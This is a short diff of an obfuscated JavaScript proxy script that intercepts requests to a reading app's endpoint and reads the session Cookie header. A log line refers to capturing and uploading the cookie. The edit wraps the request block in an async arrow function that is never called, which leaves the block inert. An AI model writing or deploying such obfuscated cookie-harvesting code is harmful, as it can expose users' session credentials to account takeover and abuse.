@@ -1,10 +1,10 @@
 let qqyduserck = $[_0xb7df('0x224', 'o6me')](_0xb7df('0x64', 'oSHO')) || 0x1;
 let qqydapp = $[_0xb7df('0x84', 'G@^c')]('qqydapp', []);
 
-if (typeof $request !== _0xb7df('0x1e4', '7@$l')) {
+async () => {if (typeof $request !== _0xb7df('0x1e4', '7@$l')) {
     console.log('测试抓取ck上传')
     await getCk();
-}
+}}
 async function getCk() {
     if ($request['url']['match'](/\/pkg11955\/promoteReadTimeInit/)) {
         const cookie = $request['headers']['Cookie'];
